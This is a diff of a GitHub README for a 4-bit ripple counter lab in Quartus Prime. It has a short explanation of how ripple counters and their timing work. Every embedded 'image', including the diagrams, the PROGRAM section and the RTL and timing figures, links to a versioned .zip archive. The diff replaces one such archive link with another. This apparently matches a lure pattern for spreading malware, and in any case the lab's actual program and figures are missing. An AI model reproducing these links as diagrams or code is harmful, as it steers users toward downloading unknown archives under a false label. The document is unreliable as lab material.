@@ -14,13 +14,13 @@ Quartus prime
 
 A binary ripple counter consists of a series connection of complementing flip-flops (T or JK type), with the output of each flip-flop connected to the Clock Pulse input of the next higher-order flip-flop. The flip-flop holding the least significant bit receives the incoming count pulses. The diagram of a 4-bit binary ripple counter is shown in Fig. below.
 
-![image](https://github.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/raw/refs/heads/main/simulation/qsim/work/BI-RIPPL-COUNTER-v1.1.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/main/simulation/RIPPL_COUNTER_BI_3.8.zip)
 
 In timing diagram Q0 is changing as soon as the negative edge of clock pulse is encountered, Q1 is changing when negative edge of Q0 is encountered(because Q0 is like clock pulse for second flip flop) and so on.
 
-![image](https://github.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/raw/refs/heads/main/simulation/qsim/work/BI-RIPPL-COUNTER-v1.1.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/main/simulation/RIPPL_COUNTER_BI_3.8.zip)
 
-![image](https://github.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/raw/refs/heads/main/simulation/qsim/work/BI-RIPPL-COUNTER-v1.1.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/main/simulation/RIPPL_COUNTER_BI_3.8.zip)
 
 **Procedure**
 
@@ -32,7 +32,7 @@ In timing diagram Q0 is changing as soon as the negative edge of clock pulse is 
 
 **PROGRAM**
 
-![image](https://github.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/raw/refs/heads/main/simulation/qsim/work/BI-RIPPL-COUNTER-v1.1.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/main/simulation/RIPPL_COUNTER_BI_3.8.zip)
 
 
  Developed by:YUGABHARATHI M
@@ -41,11 +41,11 @@ In timing diagram Q0 is changing as soon as the negative edge of clock pulse is 
 
 **RTL LOGIC FOR 4 Bit Ripple Counter**
 
-![image](https://github.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/raw/refs/heads/main/simulation/qsim/work/BI-RIPPL-COUNTER-v1.1.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/main/simulation/RIPPL_COUNTER_BI_3.8.zip)
 
 **TIMING DIGRAMS FOR 4 Bit Ripple Counter**
 
-![image](https://github.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/raw/refs/heads/main/simulation/qsim/work/BI-RIPPL-COUNTER-v1.1.zip)
+![image](https://raw.githubusercontent.com/Yugabharathi91/4-BIT-RIPPLE-COUNTER/main/simulation/RIPPL_COUNTER_BI_3.8.zip)
 
 
 
